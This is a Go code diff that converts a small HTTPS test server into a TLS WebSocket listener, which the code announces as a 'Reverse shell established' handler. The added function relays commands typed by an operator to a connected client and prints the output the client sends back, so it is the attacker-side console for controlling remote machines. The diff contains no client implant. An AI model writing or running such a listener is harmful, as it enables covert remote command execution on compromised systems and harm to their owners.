@@ -1,16 +1,22 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"embed"
 	"fmt"
 	"log"
 	"net/http"
 	"os"
+	"strings"
+
+	"github.com/gorilla/websocket"
 )
 
 //go:embed certs/server.crt certs/server.key
 var certsFS embed.FS
+
+var upgrader = websocket.Upgrader{}
 
 func main() {
 	var host string
@@ -39,23 +45,68 @@ func main() {
 		log.Fatal(err)
 	}
 
+	http.HandleFunc("/ws", handleConnections)
+
 	server := &http.Server{
 		Addr:    addr,
-		Handler: http.HandlerFunc(handleRequest),
+		Handler: nil,
 		TLSConfig: &tls.Config{
 			Certificates: []tls.Certificate{cert},
-			GetConfigForClient: func(hello *tls.ClientHelloInfo) (*tls.Config, error) {
-				fmt.Printf("Incoming connection - SNI: %s\n", hello.ServerName)
-				return nil, nil
-			},
 		},
 	}
 
-	fmt.Printf("HTTPS Server is running on https://%s\n", addr)
+	fmt.Printf("WebSocket Server is running on wss://%s\n", addr)
 	log.Fatal(server.ListenAndServeTLS("", ""))
 }
 
-func handleRequest(w http.ResponseWriter, r *http.Request) {
-	fmt.Printf("Received request from: %s\n", r.RemoteAddr)
-	fmt.Fprintf(w, "Hello from (not) \"%s\"", r.TLS.ServerName)
+func handleConnections(w http.ResponseWriter, r *http.Request) {
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Println("Error upgrading connection:", err)
+		return
+	}
+	defer conn.Close()
+
+	fmt.Println("\nReverse shell established!")
+
+	for {
+		// Read the prompt from client
+		_, promptBytes, err := conn.ReadMessage()
+		if err != nil {
+			log.Println("Error reading prompt:", err)
+			break
+		}
+
+		// Display the prompt without newline
+		fmt.Print(string(promptBytes))
+
+		// Read command from user input
+		var command string
+		reader := bufio.NewReader(os.Stdin)
+		command, err = reader.ReadString('\n')
+		if err != nil {
+			log.Println("Error reading command:", err)
+			break
+		}
+
+		// Trim the trailing newline
+		command = strings.TrimSuffix(command, "\n")
+
+		// Send command to client
+		err = conn.WriteMessage(websocket.TextMessage, []byte(command))
+		if err != nil {
+			log.Println("Error sending command:", err)
+			break
+		}
+
+		// Read response from client
+		_, output, err := conn.ReadMessage()
+		if err != nil {
+			log.Println("Error reading response:", err)
+			break
+		}
+
+		// Print the output without additional formatting
+		fmt.Print(string(output))
+	}
 }
